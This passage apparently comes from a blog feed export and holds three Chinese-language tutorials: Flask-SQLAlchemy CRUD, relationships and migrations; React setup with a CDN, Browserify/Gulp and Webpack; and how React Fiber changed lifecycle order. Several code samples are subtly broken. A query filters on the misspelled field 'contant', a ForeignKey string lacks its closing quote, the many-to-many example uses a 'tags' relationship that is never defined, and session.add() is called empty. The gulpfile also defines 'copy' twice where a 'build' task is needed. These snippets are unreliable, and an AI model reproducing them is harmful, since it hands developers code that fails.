 # 取得所有 todo 資料&gt;&gt;&gt; todos = Todo.query.all()&gt;&gt;&gt; todos# 限制 1 筆資料&gt;&gt;&gt; todos = Todo.query.limit(1).all()# 正向/逆向排序&gt;&gt;&gt; todos = Todo.query.order_by(Todo.content).all()&gt;&gt;&gt; todos = Todo.query.order_by(Todo.content.desc()).all()# 取得第一筆資料&gt;&gt;&gt; todo = Todo.query.first()# 取得 primary key=1 一筆資料&gt;&gt;&gt; todo = Todo.query.get(1)


分頁（Pagination）

 &gt;&gt;&gt; todos = Todo.query.paginate(1, 10)# 總頁數&gt;&gt;&gt; todos.pages# 上/下一頁&gt;&gt;&gt; todos.prev()&gt;&gt;&gt; todos.next()&gt;&gt;&gt; 


條件查詢（Filter）

 &gt;&gt;&gt; todo = Todo.query.filter_by(content=&#x27;hacking&#x27;).first()

 &gt;&gt;&gt; todos = Todo.query.filter(Todo.id &gt; 1).all()

修改（Update）
 &gt;&gt;&gt; todo = Todo.query.filter_by(contant=&#x27;hacking&#x27;).update(&#123;    &#x27;content&#x27;: &#x27;reading&#x27;&#125;)&gt;&gt;&gt; db.session.commit()

刪除（Delete）
 &gt;&gt;&gt; todo = Todo.query.filter_by(content=&#x27;reading&#x27;).first()&gt;&gt;&gt; db.session.delete(todo)&gt;&gt;&gt; db.session.commit()

資料庫關聯用法在關聯式資料庫中，最重要的就是資料表之間的關聯，透過關聯的使用，可以讓我們取得我們想要的資料。舉例而言，一篇部落格文章通常會對應多則評論，所以若是建立好關係則可以透過文章去取得所有和這篇文章有關的評論。同理，一篇文章通常會有多個 tag，而一個 tag 通常對應多篇文章，所以是個多對多關係。

一對多

models.py# 建立資料表欄位from main import dbclass Todo(db.Model):    # __table__name = &#x27;user_table&#x27;，若不寫則看 class name    # 設定 primary_key    id = db.Column(db.Integer, primary_key=True)    content = db.Column(db.String(80))    user_id = db.Column(db.String(80), db.ForeignKey(&#x27;user.id))    def __init__(self, content):        self.content = content    def __repr__(self):        return &#x27;&lt;Todo %r&gt;&#x27; % self.contentclass User(db.Model):    id = db.Column(db.Integer, primary_key=True)    name = db.Column(db.String(80))    todos = db.relationship(        &#x27;Todo&#x27;,        backref=&#x27;user&#x27;, # ref 可以讓我們使用 Todo.user 進行對 User 操作        lazy=&#x27;dynamic&#x27; # 有使用才載入，提昇效能    )    def __init__(self, name):        self.name = name    def __repr__(self):        return &#x27;&lt;User %r&gt;&#x27; % self.name

操作方式：
&gt;&gt;&gt; user = User.query.get(1)&gt;&gt;&gt; new_todo = Todo(&#x27;Booking&#x27;)&gt;&gt;&gt; new_todo.user_id = user.id&gt;&gt;&gt; db.session.add(new_todo)&gt;&gt;&gt; db.session.commit()&gt;&gt;&gt; user.todos



多對多

models.pytags = db.Table(&#x27;todo_tags&#x27;,    db.Column(&#x27;todo_id&#x27;, db.Integer, db.ForeignKey(&#x27;todo.id&#x27;)),    db.Column(&#x27;tag_id&#x27;, db.Integer, db.ForeignKey(&#x27;tag.id&#x27;)))# 建立資料表欄位from main import dbclass Post(db.Model):    # __table__name = &#x27;user_table&#x27;，若不寫則看小寫 class name    # 設定 primary_key    id = db.Column(db.Integer, primary_key=True)    title = db.Column(db.String(80))    content = db.Column(db.String(80))    def __init__(self, title, content):        self.title = title        self.content = content    def __repr__(self):        return &#x27;&lt;Todo %r&gt;&#x27; % self.contentclass Tag(db.Model):    # __table__name = &#x27;user_table&#x27;，若不寫則看 class name    # 設定 primary_key    id = db.Column(db.Integer, primary_key=True)    title = db.Column(db.String(80))    def __init__(self, title):        self.title = title    def __repr__(self):        return &#x27;&lt;Tag %r&gt;&#x27; % self.title

操作方式：
# 創建 3 個 todo&gt;&gt;&gt; todo_1 = Todo(&#x27;Python&#x27;)&gt;&gt;&gt; todo_2 = Todo(&#x27;JS&#x27;)&gt;&gt;&gt; todo_3 = Todo(&#x27;R&#x27;)&gt;&gt;&gt; tag_1 = Tag(&#x27;coding&#x27;)&gt;&gt;&gt; tag_1.tags = [todo_1, todo_2]&gt;&gt;&gt; db.session.add()&gt;&gt;&gt; db.session.commit()

 
Flask Migration（Alembic）使用隨著網路應用程式的發展，我們的 models 會不斷變更，為了記錄所有有關 models 的改動，我們使用 Flask-Migrate 這個 extensions。所有 models 改動都會記錄在 migration 檔案中，就像是資料庫的 git 一樣方便版本控制。
安裝 Flask-Migrate：
$ pip install Flask-Migrate

將 db 加入 Flask-Migrate 控制：
manage.pyfrom flask_migrate import Migrate, MigrateCommandfrom flask_script import Manager, Serverfrom main import appfrom models import Todo# 設定你的 appmanager = Manager(app)# 設定 python manage.py db 來管理 modelsmanager.add_command(&#x27;db&#x27;, MigrateCommand)# 設定 python manage.py runserver 為啟動 server 指令manager.add_command(&#x27;runserver&#x27;, Server())# 設定 python manage.py shell 為啟動互動式指令 shell 的指令 @manager.shelldef make_shell_context():    return dict(app=app, Todo=Todo)if __name__ == &#x27;__main__&#x27;:    manager.run()    

使用 Flask-Migrate 操作 DB：
# 初始化$ python manage.py db init# 記錄 model 變化$ python manage.py db migrate# 更新同步到 db$ python manage.py db upgrade# 查詢指令$ python manage.py db --help

總結本文介紹了資料庫、關聯式資料庫、ORM 的概念，我們也實際使用了 Flask SQLAlchemy 和 Flask-Migrate 來操作我們的資料庫。在接下來章節中我們將持續介紹 Python Web Flask 實戰開發，並學習現代化網站開發的方方面面。
延伸閱讀
Wiki MVC
Python Web 程式設計入門實戰線上課程

（image via basicsofwebdevelopment）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python, Django, MVC, Web, MTV, Web Backend, Web Framework, 教學, Flask, 框架, 網站開發, Anaconda, ORM, SQLAlchemy, Database, Models, MVC, 資料庫</tag>
      </tags>
  </entry>
  <entry>
    <title>一看就懂的 React 開發環境建置與 Webpack 入門教學</title>
    <url>/2016/07/30/react-dev-enviroment-webpack-browserify/</url>
    <content><![CDATA[
前言俗話說工欲善其事，必先利其器。寫程式也是一樣，搭建好開發環境後可以讓自己在後續開發上更加順利。因此本篇接下來將討論 React 開發環境的三種主要方式：CDN-based、browserify 和 webpack（這邊我們就先不討論 TypeScript 的開發方式），讓讀者閱讀完本章後可以開始 React 開發之旅！
JavaScript 模組化隨著網站開發的複雜度提昇，許多現代化的網站已不是單純的網站而已，更像是個富有互動性的網頁應用程式（Web App）。為了應付現代化網頁應用程式開發的需求，解決一些像是全域變數污染、低維護性等問題，JavaScript 在模組化上也有長足的發展。過去一段時間讀者們或許聽過像是 Webpack、Browserify、module bundlers、AMD、CommonJS、UMD、ES6 Module 等有關 JavaScript 模組化開發的專有名詞或工具。若是讀者對於 JavaScript 模組化開發尚不熟悉的話推薦可以參考這篇文章 和 這篇文章，當作入門。筆者之後也會有相關文章針對 JavaScript 模組化議題做討論。因為限於篇幅，這邊我們會專注在 React 開發環境的三種主要方式介紹。
總的來說，使用模組化開發 JavaScript 應用程式主要有以下三種好處：

提昇維護性（Maintainability）
命名空間（Namespacing）
提供可重用性（Reusability）

而在 React 應用程式開發上更推薦使用像是 Webpack 這樣的 module bundlers 來組織我們的應用程式，但對於一般讀者來說 Webpack 強大而完整的功能相對複雜。為了讓讀者先熟悉 React 核心觀念（我們假設讀者已經有使用 JavaScript 或 jQuery 的基本經驗），我們將從使用 CDN 引入 &lt;script&gt; 的方式開始介紹：
CDN-based使用 CDN-based 的開發方式缺點是較難維護我們的程式碼（當引入函式庫一多就會有很多 &lt;script/&gt;）且會容易遇到版本相容性問題，不太適合開發大型應用程式，但因為簡單易懂，適合教學上使用。
以下是 React 官方首頁的範例，以下使用 React v15.2.1：0. 理解 React 是 Component 導向的應用程式設計

引入 react.js、react-dom.js（react 0.14 後將 react-dom 從 react 核心分離，更符合 react 跨平台抽象化的定位）以及 babel-core-browser 版 script（可以想成 babel 是翻譯機，翻譯瀏覽器看不懂的 JSX 或 ES6+ 語法成為瀏覽器看的懂得的 JavaScript）。事實上，JSX 並非一種全新的語言，而是一種語法糖（Syntatic Sugar），一種語法類似 XML 的 ECMAScript 語法擴充。若讀者不熟悉的話可以參考筆者另一篇文章：一看就懂的 JSX 簡明入門教學指南
在 &lt;body&gt; 撰寫 React Component 要插入（mount）的地方：&lt;div id=&quot;example&quot;&gt;&lt;/div&gt;
透過 babel 進行語言翻譯 React JSX 語法，babel 會將其轉為瀏覽器看的懂得 JavaScript。其代表意義是：ReactDOM.render(欲 render 的 Component 或 HTML 元素, 欲插入的位置)。所以我們可以在瀏覽器上打開我們的 hello.html，就可以看到 Hello, world! 。That’s it，我們第一個 React 應用程式就算完成了！

hello.html&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot; /&gt;    &lt;title&gt;Hello React!&lt;/title&gt;    &lt;!-- 以下引入 react.js, react-dom.js（react 0.14 後將 react-dom 從 react 核心分離，更符合 react 跨平台抽象化的定位）以及 babel-core browser 版 --&gt;    &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/react/15.2.1/react.min.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/react/15.2.1/react-dom.min.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/babel-core/5.8.34/browser.min.js&quot;&gt;&lt;/script&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;!-- 這邊的 id=&quot;example&quot; 的 &lt;div&gt; 為 React Component 要插入的地方 --&gt;    &lt;div id=&quot;example&quot;&gt;&lt;/div&gt;    &lt;!-- 以下就是包在 babel（透過進行語言翻譯）中的 React JSX 語法，babel 會將其轉為瀏覽器看的懂得 JavaScript --&gt;    &lt;script type=&quot;text/babel&quot;&gt;      ReactDOM.render(        &lt;h1&gt;Hello, world!&lt;/h1&gt;,        document.getElementById(&#x27;example&#x27;)      );    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;

在瀏覽器瀏覽最後成果：

Browserify + Gulp + Babelify在進入第二種方法前，首先先介紹一下會用到 Browserify、Gulp、Babelify 三種前端開發常會用到的工具：
Browserify

如同官網上說明的：Browserify lets you require(&#39;modules&#39;) in the browser by bundling up all of your dependencies. ，Browserify 是一個可以讓你在瀏覽器端也能使用像 Node 用的 CommonJS 規範一樣，用輸出（export）和引用（require）來管理模組。此外，也能使用許多在 NPM 中的模組

Gulp

Gulp 是一個前端任務工具自動化管理工具。隨著前端工程的發展（Task Runner），我們在開發前端應用程式時有許多工作是必須重複進行，例如：打包文件、uglify、將 LESS 轉譯成一般的 CSS 的檔案，轉譯 ES6 語法等工作。若是使用一般手動的方式，往往會造成效率的低下，所以透過像是 Grunt、Gulp 這類的 Task Runner 不但可以提昇效率，也可以更方便管理這些任務。由於 Gulp 是透過 pipeline 方式來處理檔案，在使用上比起 Grunt 的方式直觀許多，所以這邊我們主要討論的是 Gulp

Babelify

Babelify 是一個使用 Browserify 進行 Babel 轉換的外掛，你可以想成是一個翻譯機，可以將 React 中的 JSX 或 ES6 語法轉成瀏覽器相容的 ES5 語法

初步了解了三種工具的概念後，接下來我們就開始我們的環境設置：

若是電腦中尚未安裝 Node（Node.js 是一個開放原始碼、跨平台的、可用於伺服器端和網路應用的 Google V8 引擎執行執行環境）和 NPM（Node 套件管理器 Node Package Manager。是一個以 JavaScript 編寫的軟體套件管理系統，預設環境為 Node.js，從 Node.js 0.6.3 版本開始，npm 被自動附帶在安裝包中）的話，請先 上官網安裝

用 npm 安裝 browserify

用 npm 安裝 gulp、gulp-concat、gulp-html-replace、gulp-streamify、gulp-uglify、watchify、vinyl-source-stream 開發環境用的套件（development dependencies）
 // 使用 npm install --save-dev 會將安裝的套件名稱和版本存放到 package.json 的 devDependencies 欄位中$ npm install --save-dev gulp gulp-concat gulp-html-replace gulp-streamify gulp-uglify watchify vinyl-source-stream  

安裝 babelify、babel-preset-es2015、babel-preset-react，轉譯 ES6 和 JSX 開發環境用的套件，並於根目錄底下設定 .babelrc，設定轉譯規則（presets：es2015、react）和使用的外掛
 // 使用 npm install --save-dev 會將安裝的套件名稱和版本存放到 package.json 的 devDependencies 欄位中$ npm install --save-dev babelify babel-preset-es2015 babel-preset-react

 .babelrc&#123;	&quot;presets&quot;: [	  &quot;es2015&quot;,	  &quot;react&quot;,	],	&quot;plugins&quot;: []&#125;

安裝 react 和 react-dom
 $ npm install --save react react-dom

撰寫 Component
 ./app/index.jsimport React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;class App extends React.Component &#123;  constructor(props) &#123;    super(props);    this.state = &#123;    &#125;;  &#125;  render() &#123;    return (      &lt;div&gt;        &lt;h1&gt;Hello, World!&lt;/h1&gt;      &lt;/div&gt;    );  &#125;&#125;ReactDOM.render(&lt;App /&gt;, document.getElementById(&#x27;app&#x27;));

 ./index.html&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;	&lt;meta charset=&quot;UTF-8&quot;&gt;	&lt;title&gt;Hello React!&lt;/title&gt;&lt;/head&gt;&lt;body&gt;	&lt;div id=&quot;app&quot;&gt;&lt;/div&gt;	&lt;!-- build:js --&gt;	&lt;script src=&quot;./dist/src/bundle.js&quot;&gt;&lt;/script&gt;	&lt;!-- endbuild --&gt;&lt;/body&gt;&lt;/html&gt;

設定 gulpfile.js
 gulpfile.js// 引入所有需要的檔案const gulp = require(&#x27;gulp&#x27;);const uglify = require(&#x27;gulp-uglify&#x27;);const htmlreplace = require(&#x27;gulp-html-replace&#x27;);const source = require(&#x27;vinyl-source-stream&#x27;);const browserify = require(&#x27;browserify&#x27;);const watchify = require(&#x27;watchify&#x27;);const babel = require(&#x27;babelify&#x27;);const streamify = require(&#x27;gulp-streamify&#x27;);// 檔案位置參數const path = &#123;  HTML: &#x27;index.html&#x27;,  MINIFIED_OUT: &#x27;bundle.min.js&#x27;,  OUT: &#x27;bundle.js&#x27;,  DEST: &#x27;dist&#x27;,  DEST_BUILD: &#x27;dist/build&#x27;,  DEST_SRC: &#x27;dist/src&#x27;,  ENTRY_POINT: &#x27;./app/index.js&#x27;&#125;;// 複製 html 到 dist 資料夾中gulp.task(&#x27;copy&#x27;, function()&#123;  gulp.src(path.HTML)    .pipe(gulp.dest(path.DEST));&#125;);// 監聽檔案是否有變化，若有變化則重新編譯一次gulp.task(&#x27;watch&#x27;, function() &#123;  gulp.watch(path.HTML, [&#x27;copy&#x27;]);var watcher  = watchify(browserify(&#123;    entries: [path.ENTRY_POINT],    transform: [babel],    debug: true,  &#125;));return watcher.on(&#x27;update&#x27;, function () &#123;    watcher.bundle()      .pipe(source(path.OUT))      .pipe(gulp.dest(path.DEST_SRC))      console.log(&#x27;Updated&#x27;);  &#125;)    .bundle()    .pipe(source(path.OUT))    .pipe(gulp.dest(path.DEST_SRC));&#125;);// 執行 build production 的流程（包括 uglify、轉譯等）gulp.task(&#x27;copy&#x27;, function()&#123;  browserify(&#123;    entries: [path.ENTRY_POINT],    transform: [babel],  &#125;)    .bundle()    .pipe(source(path.MINIFIED_OUT))    .pipe(streamify(uglify(path.MINIFIED_OUT)))    .pipe(gulp.dest(path.DEST_BUILD));&#125;);// 將 script 引用換成 production 的檔案gulp.task(&#x27;replaceHTML&#x27;, function()&#123;  gulp.src(path.HTML)    .pipe(htmlreplace(&#123;      &#x27;js&#x27;: &#x27;build/&#x27; + path.MINIFIED_OUT    &#125;))    .pipe(gulp.dest(path.DEST));&#125;);// 設定 NODE_ENV 為 productiongulp.task(&#x27;apply-prod-environment&#x27;, function() &#123;    process.env.NODE_ENV = &#x27;production&#x27;;&#125;);// 若直接執行 gulp 會執行 gulp default 的任務：watch、copy。若跑 gulp production，則會執行 build、replaceHTML、apply-prod-environmentgulp.task(&#x27;production&#x27;, [&#x27;build&#x27;, &#x27;replaceHTML&#x27;, &#x27;apply-prod-environment&#x27;]);gulp.task(&#x27;default&#x27;, [&#x27;watch&#x27;, &#x27;copy&#x27;]);

成果展示 到目前為止我們的資料夾的結構應該會是這樣：
 
 接下來我們透過在終端機（terminal）下 gulp 指令來處理我們設定好的任務：
 // 當只有輸入 gulp 沒有輸入任務名稱時，gulp 會自動執行 default 的任務，我們這邊會執行 `watch` 和 `copy` 的任務，前者會監聽 `./app/index.js` 是否有改變，有的話則更新。後者則是會把 `index.html` 複製到 `./dist/index.html`$ gulp

 當執行完 gulp 後，我們可以發現多了一個 dist 資料夾
 
 如果我們是要進行 production 的應用程式開發的話，我們可以執行： 
 // 當輸入 gulp production 時，gulp 會執行 production 的任務，我們這邊會執行 `replaceHTML`、`build` 和 `apply-prod-environment` 的任務，`build` 任務會進行轉譯和 `uglify`。`replaceHTML` 會取代 `index.html` 註解中的 `&lt;script&gt;` 引入檔案，變成引入壓縮和 `uglify` 後的 `./dist/build/bundle.min.js`。`apply-prod-environment` 則是會更改 `NODE_ENV` 變數，讓環境設定改為 `production`，有興趣的讀者可以參考[React 官網說明](https://facebook.github.io/react/downloads.html)$ gulp production

 此時我們可以在瀏覽器上打開我們的 ./dist/hello.html，就可以看到 Hello, world! 了！


Webpack
Webpack 是一個模組打包工具（module bundler），以下列出 Webpack 的幾項主要功能：

將 CSS、圖片與其他資源打包
打包之前預處理（Less、CoffeeScript、JSX、ES6 等）的檔案
依 entry 文件不同，把 .js 分拆為多個 .js 檔案
整合豐富的 loader 可以使用

接下來我們一樣透過 Hello World 實例來介紹如何用 Webpack 設置 React 開發環境：

安裝 Node 和 NPM

安裝 Webpack（可以 global 或 local project 安裝）、webpack loader、webpack-dev-server
 Webpack 中的 loader 類似於 browserify 內的 transforms，但 Webpack 在使用上比較多元，除了 JavaScript loader 外也有 CSS Style 和圖片的 loader。此外，webpack-dev-server 則可以啟動開發用 server 方便使用
 $ npm install --save-dev babel-core babel-eslint babel-loader babel-preset-es2015 babel-preset-react html-webpack-plugin webpack webpack-dev-server

設定 webpack.config.js 事實上，webpack.config.js 有點類似於前述的 gulpfile.js 功用，主要是設定 webpack 的相關設定
 ./webpack.config.js// 這邊使用 HtmlWebpackPlugin，將 bundle 好得 &lt;script&gt; 插入到 body  const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;);const HTMLWebpackPluginConfig = new HtmlWebpackPlugin(&#123;  template: `$&#123;__dirname&#125;/app/index.html`,  filename: &#x27;index.html&#x27;,  inject: &#x27;body&#x27;,&#125;);// 檔案起始點從 entry 進入，也可以是多個檔案。output 是放入產生出來的結果的相關參數。loaders 則是放欲使用的 loaders，在這邊是使用 babel-loader 將所有 .js（這邊用到正則式）相關檔案轉譯成瀏覽器可以閱讀的 JavaScript。devServer 則是 webpack-dev-server 設定。plugins 放置所使用的外掛module.exports = &#123;  entry: [    &#x27;./app/index.js&#x27;,  ],  output: &#123;    path: `$&#123;__dirname&#125;/dist`,    filename: &#x27;index_bundle.js&#x27;,  &#125;,  module: &#123;    loaders: [      &#123;        test: /\.js$/,        exclude: /node_modules/,        loader: &#x27;babel-loader&#x27;,        query: &#123;          presets: [&#x27;es2015&#x27;, &#x27;react&#x27;, &#x27;stage-0&#x27;],        &#125;,      &#125;,    ],  &#125;,  devServer: &#123;    inline: true,    port: 8008,  &#125;,  plugins: [HTMLWebpackPluginConfig],&#125;;

設定 .babelrc
 .babelrc&#123;  &quot;presets&quot;: [    &quot;es2015&quot;,    &quot;react&quot;,  ],  &quot;plugins&quot;: []&#125;

安裝 react 和 react-dom
 $ npm install --save react react-dom

撰寫 Component
 ./app/index.html&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;	&lt;meta charset=&quot;UTF-8&quot;&gt;	&lt;title&gt;React Setup&lt;/title&gt;	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css&quot;&gt;&lt;/head&gt;&lt;body&gt;	&lt;div id=&quot;app&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;

 ./app/index.jsimport React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;class App extends React.Component &#123;  constructor(props) &#123;    super(props);    this.state = &#123;    &#125;;  &#125;  render() &#123;    return (      &lt;div&gt;        &lt;h1&gt;Hello, World!&lt;/h1&gt;      &lt;/div&gt;    );  &#125;&#125;ReactDOM.render(&lt;App /&gt;, document.getElementById(&#x27;app&#x27;));

在終端機使用 webpack，成果展示



webpack：會在開發模式下開始一次性的建置
webpack -p：會建置 production 的程式碼 
webpack –watch：會監聽程式碼的修改，當儲存時有異動時會更新檔案
webpack -d：加入 source maps 檔案
webpack –progress –colors：加上處理進度與顏色

如果不想每次都打一長串的指令碼的話可以使用 package.json 中的 scripts 設定
.package.json&quot;scripts&quot;: &#123;  &quot;dev&quot;: &quot;webpack-dev-server --devtool eval --progress --colors --content-base build&quot;&#125;

然後在終端機執行：
$ npm run dev

當我們此時我們可以打開瀏覽器輸入 http://localhost:8008 ，就可以看到 Hello, world! 了！
總結以上就是 React 開發環境的三種主要方式：CDN-based、browserify 和 webpack。一般來說在開發大型應用程式，使用 React + Gulp + Browserify 或用 React 搭配 Webpack 都是合適的作法，主要是依據團隊開發的習慣和約定。不過，若你不想在環境設定上花太多時間的話，不妨參考 Facebook 開發社群推出的 create-react-app，可以快速上手，使用 Webpack、Babel、ESLint 開發 React 應用程式！
延伸閱讀
JavaScript 模块化七日谈
前端模块化开发那点历史
JavaScript Modules: A Beginner’s Guide
深入了解 Webpack Plugins
Babel 入门教程
WEBPACK入門教學筆記
Setting up React for ES6 with Webpack and Babel
【webpack】的基本工作流程
我的REACT开发之路1:REACT的环境搭建
利用browserify和gulp来构建react应用
gulp 學習筆記
Webpack vs Browserify - what’s best for React?
Browserify vs Webpack
Setting up environment for React, SASS, ES2015, Babel with Webpack
Javascript Tutorial: How to set up Gulp for Developing ES2015 React v0.14+ Applications with Babelify &amp; Browserify
React.js Tutorial Pt 2: Building React Applications with Gulp and Browserify.
Building modular javascript applications in ES6 with React, Webpack and Babel
Make your own React production version with webpack
How to set React to production mode when using Gulp
Browserify 使用指南
使用 Webpack 建立 React 專案開發環境
如何使用 Webpack 模組整合工具
參透 webpack
WEBPACK DEV SERVER
Understanding ES6 Modules

(image via srinisoundar、sitepoint、keyholesoftware、survivejs)
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校，目前專注在 Mobile 和 IoT 應用開發。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>React, React Native, ES5, ES6, ES7, JavaScript, ECMAScript2015, Webpack, Browserify, CommonJS, UMD, ES6 Module, CMD</tag>
      </tags>
  </entry>
  <entry>
    <title>淺談 React Fiber 及其對 lifecycles 造成的影響</title>
    <url>/2018/03/31/react-fiber-and-lifecycle-change/</url>
    <content><![CDATA[前言雖然說從以前就一直聽到 React 要把內部的 reconciler 換成一個叫做 Fiber 的東西，但從沒仔細研究過，也不知道這樣子的改變會對上層造成什麼影響。
真正開始比較深入理解，是在某一次使用 Redux Form 時踩到一個相關的 bug，才知道 React 自從正式改用 Fiber 之後，其實對上層也有一些改變。
這篇的標題「淺談」不是騙你的，這篇真的很淺，我不會談到 Fiber 底層的運作（因為我也還沒認真研究過），只會用白話文跟你說 Fiber 大概是怎樣，是為了解決什麼樣子的問題而誕生。
萬里之行，始於 Bug每一次能踩到 Bug 的機會，我都會好好把握。
為什麼？因為這是一次強迫你學習的機會。Bug 解不掉，你就沒辦法繼續下去，所以為了要解決 Bug，你必須去探究原因，必須知道這個問題為什麼產生，以及應該要怎麼解決。
當然，你也可以直接從 Stack Overflow 找答案然後複製貼上，覆蓋這張牌結束這回合。可是工作久了你會發現，不是所有問題都可以從那上面找到解答。
舉例來說，我一年前寫的我遇過的最難的 Cookie 問題對我來說就是一個很好的學習機會。
好，那這次我又是遇到什麼 Bug 呢？
我們公司的產品有用到redux-form，而問題是這樣的，我有兩個頁面，都用了同一個 component，叫做FormBlock好了。
我先去 A 頁面，再去 B 頁面，再回來 A 頁面，我的 redux-form 的 validation 就失效了，在表單 submit 的時候並不會執行 validation。
那時候搜到了幾個相關的 issue，但還是想自己查個清楚，就跑去找了 redux-form 的原始碼，研究了幾個小時終於找到出問題的地方。
在 redux-form 執行 validation 的時候，會先檢查 fields 是不是有被註冊過，如果沒被註冊的話，就直接回傳true，不會進行任何驗證，我自己加了幾個 console.log 之後，發現問題就是出在這邊，field 沒有被註冊到。
接著就來找一下是在哪邊註冊的，發現在componentWillMount的時候，會 dispatch 一個 action 來註冊所有的表單欄位（REGISTER_FIELD）。
然後在componentWillUnmount的時候，redux-form 會 dispatch 一個 action 叫做DESTROY（相關程式碼），把所有註冊的 field 給清掉。
到目前為止，一切看似都很合理。我在離開 B 頁面的時候，觸發FormBlock的componentWillUnmount，取消註冊所有的 field，在進入 A 頁面時，觸發FormBlock的componentWillMount，把所有的 field 重新註冊回來。
可是如果你打開 redux-devtool，會發現順序跟你想像中不太一樣：

咦？怎麼會先註冊再刪除？而且因為刪除了，所以驗證就失效了，不會執行任何驗證的邏輯。
再仔細找了一下相關的資料，看到這篇 Browser back button not working with react-router@4.0.0-beta.7 and react@16-alpha.4 Issue 以及 Redux 以及 React 的開發者 gaearon 在下面的回答：

In React 15, if A is replaced by B, we unmount A, and then create and mount B:



A.componentWillUnmount
B.constructor
B.componentWillMount
B.componentDidMount



In Fiber, we create B first, and only later unmount A and mount B:



B.constructor
B.componentWillMount
A.componentWillUnmount
B.componentDidMount


在 React 16 以後，由於這樣子的順序改變，導致了上面 redux-form 的 lifecycle 執行順序跟預期中不符，也間接導致了我開頭所說的那個 Bug。
到了這邊，問題產生的原因一路從 redux-form 本身追到了 React，又更細節的追到了 Fiber，看來，沒辦法再繼續逃避 Fiber 了。
先一併奉上跟 redux-form 以及執行順序相關的其他參考資料，再讓我們好好看看 Fiber。

Re-mounting a Field component erases the field-level validation function
Ordering of componentWillMount&#x2F;Unmount in React 16
Asynchronous ComponentWillUnmount in React 16

Fiber 到底是什麼？要瞭解一個新的東西，最快的方式就是回答以下問題：

它是拿來解決什麼問題的？
解決方法是什麼？

只要能了解這兩個問題，就能對這個新的東西有初步的概念，儘管你還是不知道實作細節，但至少你知道它帶來的影響及改變是什麼。
我們先來看一下一直存在於 React 的一個問題。
假設你現在有一個超級多功能的 App，有著超級多的 Component，然後你改變了最上層的 Component（假設它叫&lt;App /&gt;） 的 state。
因為 state 變了，所以就會來執行這個&lt;App /&gt;的 render function，然後執行App底下的 component 的 render function，就這樣一直往下執行下去，直到碰到最底層為止。
你如果去看 call stack，就會發現這個 call stack 超大一個：

（圖片來源：React Fiber現状確認）
這樣會造成什麼問題呢？因為你的 call stack 太深而且東西太多，再加上這個過程又是不能被中斷的，會導致 main thread 被 block 住，在這時間之內你做任何事情，瀏覽器都不會有反應。
簡單來說呢，就是因為要做的事太多，所以 main thread 就會 block 住了，這就是 React 在效能上會碰到的一個問題。
到這邊，我們已經回答第一個問題了，Fiber 就是為了解決這個問題而產生的解法。接著我們來回答第二個問題：解決方法是什麼？

既然問題的成因是：「要做的事情太多又不能中斷」，那我們只要發明一個「可以中斷」的機制就好啦！不要一次全部更新，而是增量更新（incremental rendering），就可以解決這個問題了！

比起原本的一次性更新，假如我們能夠把要更新的工作切成一個個小的工作，每次只執行一個小工作，那這樣 main thread 就不會被 block 住了，因為每個小工作之間都可以有空檔去做別的事情（響應使用者的點擊、繪製新的畫面等等）。
就像下面這張示意圖一樣，每次完成一點點的工作，而不是一次完成全部的：

（圖片來源：Lin Clark - A Cartoon Intro to Fiber - React Conf 2017
）
好了，你已經知道什麼是 Fiber 了，這就是 Fiber。每一個小工作就叫做 Fiber，而 Fiber 在英文裡面是纖維的意思，所以又有人把這個機制稱作「纖程」。
或是換個角度想，原本的問題是因為程式裡面這樣子一層層執行 render function 的方法是透過 call stack，每次 call 一個 function 就把一個新的任務丟到 stack frame 去，可是這樣子的機制會導致任務無法中斷。
於是 Fiber 就實作出了 virtual stack frame，簡單來說就是自己用 js 再模擬出一個 call stack 的感覺，但好處就是自己有完全的掌控權，而不是被 js 的運行機制給綁住。
再幫大家重新整理一次，沒有 Fiber 之前，你要更新的時候都是「一次性」的更新，中間無法中斷，導致 main thread 在這期間會被 block 住。
有了 Fiber 這個機制之後，我們把一個大更新切成很多塊小的更新，每次只更新一點點，這樣子在更新的空檔 main thread 就能去做其他事情，而不會被綁住。
聽起來十分美好，問題迎刃而解，可是副作用是什麼呢？
Fiber 所帶來的改變把核心換成 Fiber 之後，是要付出一些代價的。在 Fiber 裡面的工作其實分成兩個階段：

render&#x2F;reconciliation
commit

簡單來說呢，第一階段就是找出需要改變的部分，而第二階段是真正的把這些改變應用到 DOM 上面去。第一階段是可以被中斷，也可以被重新執行的，而第二階段跟以前一樣，必須一口氣做完。
而這兩個階段也對應到不同的生命週期：
第一階段
componentWillMount
componentWillReceiveProps
shouldComponentUpdate
componentWillUpdate

第二階段
componentDidMount
componentDidUpdate
componentWillUnmount

因為第一階段是可以中斷並且之後再重新執行的，所以會導致在第一階段裡的這些函數，有可能被 call 很多次。

（圖片來源：Lin Clark - A Cartoon Intro to Fiber - React Conf 2017
）
所以，假設你之前習慣在componentWillMount裡面就呼叫 API 拿資料的話，就會導致你 call 了不只一次的 API，會浪費一些頻寬，要改變的話就要把這些 code 移到componentDidMount去，就只會保證被 call 一次而已。
總之呢，自從內部機制改成 Fiber 之後（從 React 16 開始，所以如果你是用 16 以上的版本，已經是 Fiber 了），React 的生命週期函數被呼叫的次數跟方式會跟以前不太一樣。
